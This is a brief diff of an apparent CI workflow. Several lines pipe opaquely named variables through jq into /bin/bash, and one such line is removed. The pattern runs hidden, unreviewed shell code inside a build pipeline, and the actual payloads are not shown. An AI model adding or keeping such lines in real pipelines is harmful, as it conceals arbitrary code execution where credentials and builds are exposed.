@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
           echo $xwulg98 | jq -r .uhpuq039 | /bin/bash
           echo $sjq40 | jq -r .mdl3 | /bin/bash
-          echo $ulb3 | jq -r .j9341 | /bin/bash
           echo $n8951 | jq -r .zf1788 | /bin/bash
 
       - name: Persist output
